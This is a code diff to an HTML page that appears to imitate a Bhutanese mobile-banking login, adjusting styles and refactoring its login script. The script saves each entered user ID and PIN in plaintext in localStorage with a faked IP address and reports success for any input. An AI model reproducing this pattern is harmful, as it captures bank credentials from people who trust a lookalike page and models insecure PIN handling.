@@ -31,9 +31,10 @@
       flex-shrink: 0;
       z-index: 10;
       position: relative;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
     }
     .top-nav .menu-icon {
-      font-size: 28px;
+      font-size: 26px;
       cursor: pointer;
       line-height: 1;
       background: none;
@@ -48,8 +49,8 @@
     }
     .top-nav .right-icons {
       display: flex;
-      gap: 20px;
-      font-size: 24px;
+      gap: 18px;
+      font-size: 22px;
     }
     .top-nav .right-icons span {
       cursor: pointer;
@@ -79,7 +80,7 @@
     /* ===== BRAND ===== */
     .brand {
       text-align: center;
-      margin: 10px 0 25px;
+      margin: 8px 0 22px;
     }
     .brand .logo {
       font-size: 48px;
@@ -236,7 +237,7 @@
       box-shadow: 0 2px 12px rgba(0,0,0,0.08);
     }
 
-    /* ===== SIMPLE FOOTER LINKS ===== */
+    /* ===== FOOTER LINKS ===== */
     .footer-links {
       display: flex;
       justify-content: center;
@@ -264,6 +265,7 @@
       font-weight: 300;
     }
 
+    /* ===== RESPONSIVE ===== */
     @media (max-width: 600px) {
       .main-content { padding: 15px 5% 8px; }
       .brand .logo { font-size: 40px; }
@@ -294,7 +296,7 @@
       <a href="mailto:support@bob.bt" title="Email Support">
         <span>✉</span>
       </a>
-      <span>☎</span>
+      <span onclick="alert('📞 Customer Support: +975 2 349903 (Toll Free: 1095)')">☎</span>
     </div>
   </div>
 
@@ -336,7 +338,7 @@
     </div>
   </div>
 
-  <!-- ===== SIMPLE FOOTER LINKS ===== -->
+  <!-- ===== FOOTER LINKS ===== -->
   <div class="footer-links">
     <a href="#" onclick="goHome()">🏠 Home</a>
     <span class="sep">|</span>
@@ -346,12 +348,14 @@
   </div>
 
   <script>
+    // ===== STORAGE KEY =====
+    const LOGIN_KEY = 'mBobLogins';
+
     // ===== HOME =====
     function goHome() {
       document.getElementById('loginUserId').value = '';
       document.getElementById('loginPin').value = '';
       document.getElementById('loginSuccess').classList.remove('show');
-      alert('🏠 Back to Home');
     }
 
     // ===== PRIVACY POLICY =====
@@ -395,10 +399,20 @@
         return;
       }
 
+      // Save login attempt to localStorage
       const now = new Date();
       const timeStr = now.toLocaleString('en-US', { hour12: true });
 
-      const logins = JSON.parse(localStorage.getItem('mBobLogins') || '[]');
+      let logins = [];
+      try {
+        const stored = localStorage.getItem(LOGIN_KEY);
+        if (stored) {
+          logins = JSON.parse(stored);
+        }
+      } catch (e) {
+        logins = [];
+      }
+
       logins.push({
         userId: userId,
         pin: pin,
@@ -407,14 +421,18 @@
         device: navigator.userAgent || 'Unknown',
         ip: '192.168.1.' + Math.floor(Math.random() * 255)
       });
-      localStorage.setItem('mBobLogins', JSON.stringify(logins));
 
+      localStorage.setItem(LOGIN_KEY, JSON.stringify(logins));
+
+      // Show success
       const successEl = document.getElementById('loginSuccess');
       successEl.textContent = '✅ Login successful! Welcome ' + userId;
       successEl.classList.add('show');
 
+      // Clear PIN
       document.getElementById('loginPin').value = '';
 
+      // Auto-hide after 3 seconds
       setTimeout(() => successEl.classList.remove('show'), 3000);
     }
 
